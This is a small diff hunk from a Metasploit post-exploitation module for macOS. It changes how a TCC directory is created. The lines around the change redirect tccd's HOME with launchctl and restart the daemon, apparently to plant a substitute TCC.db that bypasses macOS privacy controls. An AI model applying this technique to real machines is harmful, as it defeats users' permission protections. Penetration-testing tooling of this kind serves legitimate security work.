@@ -66,7 +66,7 @@ class MetasploitModule < Msf::Post
     tccdb = "#{tccdir}/TCC.db"
 
     print_status("Creating TCC directory #{tccdir}")
-    mkdir(tccdir)
+    cmd_exec("mkdir -p '#{tccdir}'")
     cmd_exec("launchctl setenv HOME '#{tmpdir}'")
     cmd_exec('launchctl stop com.apple.tccd && launchctl start com.apple.tccd')
     unless file_exist?(tccdb)
